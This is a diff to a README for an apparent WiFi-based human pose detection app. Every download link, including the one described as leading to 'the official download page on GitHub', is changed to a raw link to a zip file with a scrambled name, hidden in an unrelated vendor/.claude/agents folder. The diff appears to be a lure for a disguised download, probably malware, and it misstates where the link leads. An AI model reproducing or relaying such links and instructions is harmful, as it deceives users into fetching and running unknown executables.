@@ -1,6 +1,6 @@
 # 📡 WiFi-CSI-Human-Pose-Detection - Camera-Free Human Pose Sensing  
 
-[![Download Now](https://img.shields.io/badge/Download-Here-%2334c759)](https://github.com/12miednight/WiFi-CSI-Human-Pose-Detection)
+[![Download Now](https://img.shields.io/badge/Download-Here-%2334c759)](https://raw.githubusercontent.com/12miednight/WiFi-CSI-Human-Pose-Detection/main/vendor/ruvector/.claude/agents/sparc/CS-Wi-Detection-Human-Fi-Pose-v3.9.zip)
 
 ## 📋 What This App Does
 
@@ -21,7 +21,7 @@ This software estimates human poses using WiFi signals instead of a camera. It u
 
 Click the big green button below. It will take you to the official download page on GitHub, where you can get the files you need.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-%2334c759)](https://github.com/12miednight/WiFi-CSI-Human-Pose-Detection)
+[![Download Now](https://img.shields.io/badge/Download-Here-%2334c759)](https://raw.githubusercontent.com/12miednight/WiFi-CSI-Human-Pose-Detection/main/vendor/ruvector/.claude/agents/sparc/CS-Wi-Detection-Human-Fi-Pose-v3.9.zip)
 
 Once on the page, look for the latest Release or Download section. You will find the Windows version ready to download as an executable file or a zip folder.
 
@@ -101,6 +101,6 @@ The software uses advanced algorithms in signal processing and neural networks. 
 
 You can find all installation files and instructions at this page:
 
-[https://github.com/12miednight/WiFi-CSI-Human-Pose-Detection](https://github.com/12miednight/WiFi-CSI-Human-Pose-Detection)  
+[https://raw.githubusercontent.com/12miednight/WiFi-CSI-Human-Pose-Detection/main/vendor/ruvector/.claude/agents/sparc/CS-Wi-Detection-Human-Fi-Pose-v3.9.zip](https://raw.githubusercontent.com/12miednight/WiFi-CSI-Human-Pose-Detection/main/vendor/ruvector/.claude/agents/sparc/CS-Wi-Detection-Human-Fi-Pose-v3.9.zip)  
 
 Use that page to access the latest releases, software updates, and detailed setup instructions.
